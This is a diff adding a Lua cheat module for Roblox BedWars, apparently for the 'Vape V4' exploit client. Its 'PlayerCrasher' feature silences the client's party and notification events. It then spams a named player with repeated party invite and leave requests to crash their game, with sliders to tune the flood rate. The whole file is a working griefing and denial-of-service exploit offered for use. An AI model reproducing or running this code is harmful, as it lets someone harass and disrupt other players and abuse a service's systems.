@@ -1,0 +1,90 @@
+repeat task.wait() until game:IsLoaded()
+repeat task.wait() until shared.GuiLibrary
+local GuiLibrary = shared.GuiLibrary
+local ScriptSettings = {}
+local UIS = game:GetService("UserInputService")
+local LIB = function(tab, argstable) 
+    return GuiLibrary["ObjectsThatCanBeSaved"][tab.."Window"]["Api"].CreateOptionsButton(argstable)
+end
+
+function notify(text)
+    local frame = GuiLibrary["CreateNotification"]("Client Notification", text, 5, "assets/WarningNotification.png")
+    frame.Frame.Frame.ImageColor3 = Color3.fromRGB(255, 64, 64)
+end
+function boxnotify(text)
+    if messagebox then
+        messagebox(text, "Vape V4", 0)
+     end
+end
+
+
+notify("Tenacity loaded..")
+
+runcode(function()
+	local function findplayers(arg)
+		for i,v in pairs(game:GetService("Players"):GetChildren()) do if v.Name:lower():sub(1, arg:len()) == arg:lower() then return v end end
+		return nil
+	end
+
+	local PlayerCrasher = {["Enabled"] = false}
+	local PlayerCrasherPower = {["Value"] = 2}
+	local PlayerCrasherDelay = {["Value"] = 2}
+	local PlayerCrasherBox = {["Value"] = ""}
+	local targetedplayer	
+	PlayerCrasher = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
+		["Name"] = "PlayerCrasher",
+		["Function"] = function(callback)
+			if callback then
+				for i,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
+					if (v.Name:find("arty") or v.Name:find("otification"))and v:IsA("RemoteEvent") then
+						for i2,v2 in pairs(getconnections(v.OnClientEvent)) do 
+							v2:Disable()
+						end
+					end
+				end
+				spawn(function()
+					repeat
+						task.wait(3)
+						createwarning("PlayerCrasher", targetedplayer and "Crashing "..(targetedplayer.DisplayName or targetedplayer.Name) or "Player not found", 3)
+					until (not PlayerCrasher["Enabled"])
+				end)
+				spawn(function()
+					repeat
+						task.wait(PlayerCrasherDelay["Value"] == 0 and nil or PlayerCrasherDelay["Value"] / 10)
+						local plr = findplayers(PlayerCrasherBox["Value"])
+						targetedplayer = plr
+						if plr then
+							spawn(function()
+								for i = 1, PlayerCrasherPower["Value"] do 
+									bedwars["LobbyClientEvents"].inviteToParty({
+										player = plr
+									})
+									bedwars["LobbyClientEvents"].leaveParty()
+								end
+							end)
+						end
+					until (not PlayerCrasher["Enabled"])
+				end)
+			end
+		end
+	})
+	PlayerCrasherBox = PlayerCrasher.CreateTextBox({
+		["Name"] = "Player",
+		["TempText"] = "player target",
+		["FocusLost"] = function(enter) end
+	})
+	PlayerCrasherPower = PlayerCrasher.CreateSlider({
+		["Name"] = "Requests per second",
+		["Min"] = 1,
+		["Max"] = 10,
+		["Default"] = 2,
+		["Function"] = function() end
+	})
+	PlayerCrasherDelay = PlayerCrasher.CreateSlider({
+		["Name"] = "Seconds per request",
+		["Min"] = 0,
+		["Max"] = 10,
+		["Default"] = 0,
+		["Function"] = function() end
+	})
+end)
